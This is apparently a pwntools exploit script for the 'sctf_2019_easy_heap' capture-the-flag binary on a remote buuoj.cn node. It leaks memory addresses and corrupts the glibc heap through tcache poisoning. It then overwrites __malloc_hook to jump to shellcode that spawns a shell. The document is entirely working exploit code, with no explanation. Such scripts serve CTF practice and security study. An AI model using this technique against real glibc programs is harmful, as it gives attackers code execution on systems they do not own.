from pwn import *
r = remote('node3.buuoj.cn',28547)
#r = process('./sctf_2019_easy_heap')
elf = ELF('./sctf_2019_easy_heap')
libc = ELF('/libc-2.27.so')
context(log_level = 'debug', arch = 'amd64', os = 'linux')
def add(size):
    r.recvuntil('>> ')
    r.sendline('1')
    r.recvuntil('Size: ')
    r.sendline(str(size))

def free(index):
    r.recvuntil('>> ')
    r.sendline('2')
    r.recvuntil('Index: ')
    r.sendline(str(index))

def edit(index,content):
    r.recvuntil('>> ')
    r.sendline('3')
    r.recvuntil('Index: ')
    r.sendline(str(index))
    r.recvuntil('Content: ')
    r.sendline(content)


r.recvuntil('Mmap: ')
mmap_addr = int(r.recvuntil('\n',drop=True),16)
log.success(hex(mmap_addr))

add(0xf8)#0
r.recvuntil('Address 0x')
base = int(r.recvuntil('\n',drop=True),16) - 0x202068
log.success(hex(base))
log.success(hex(base+0x202060))
add(0xf8)#1
add(0xf8)#2
add(0xf8)#3
add(0xf8)#4
add(0xf8)#5
add(0xf8)#6
add(0xf8)#7
add(0x68)#8 fuck_chunk
add(0xf8)#9
add(0x20)#10
for i in range(0,7):
    free(i)
free(7)
edit(8,p64(0)*12+p64(0x170))
free(9)

for i in range(7):
    add(0xf8)
add(0xf8)

add(0x68)#9
free(8)

edit(9,p64(base+0x202060))
add(0x68)
add(0x68)#11
add(0xf8)
add(0xf8)


for i in range(0,8):
    free(i)
add(0xf8)
add(0xf8)
add(0xf8)
add(0xf8)
add(0xf8)
add(0xf8)
add(0xf8)
add(0xd0)
payload = p64(0x88)+p64(base+0x2020e0)#0
payload += p64(0x88)+p64(base+0x2020f0)#1
edit(11,payload)
edit(0,p64(0x88)+'\x40')#8
edit(1,p64(0x88)+'\x40')#9
free(8)
add(0x20)
edit(9,'\x30')
add(0x10)#14
add(0x10)#15 malloc_hook
edit(11,p64(0x88)+p64(mmap_addr))#0
edit(0,asm(shellcraft.sh()))
edit(15,p64(mmap_addr))
free(14)
r.interactive()